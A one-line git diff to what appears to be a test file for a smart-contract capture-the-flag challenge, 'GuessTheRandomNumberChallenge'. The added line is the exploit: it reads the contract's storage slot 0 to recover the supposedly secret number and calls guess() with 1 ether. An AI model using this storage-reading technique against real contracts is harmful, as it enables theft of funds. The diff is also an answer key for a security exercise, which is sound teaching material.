@@ -10,6 +10,7 @@ describe("GuessTheRandomNumberChallenge", async function () {
 
     it("Exploit", async function () {
         // WRITE YOUR CODE HERE
+        await contract.guess(parseInt(await ethers.provider.getStorageAt(contract.address, 0)), { value: ethers.utils.parseEther("1") });
     });
 
     after(async function () {
